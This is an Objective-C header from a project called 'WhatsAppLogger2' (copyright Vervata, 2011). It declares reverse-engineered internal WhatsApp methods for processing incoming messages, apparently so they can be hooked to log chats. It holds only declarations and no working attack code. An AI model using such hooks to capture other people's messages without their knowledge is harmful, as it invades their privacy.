/*
 *  XMPPConnection.h
 *  WhatsAppLogger2
 *
 *  Created by Pichaya Srifar on 6/8/11.
 *  Copyright 2011 Vervata. All rights reserved.
 *
 */

@interface XMPPConnection : NSObject {
	
}

-(void)processIncomingMessages:(id)arg1;
- (NSString *) xmppUser;

// WhatsApp 2.8.2
@property(readonly) NSString *myJID;

// WhatsApp 2.11.3
-(void)processIncomingMessageStanzas:(id)stanzas;

@end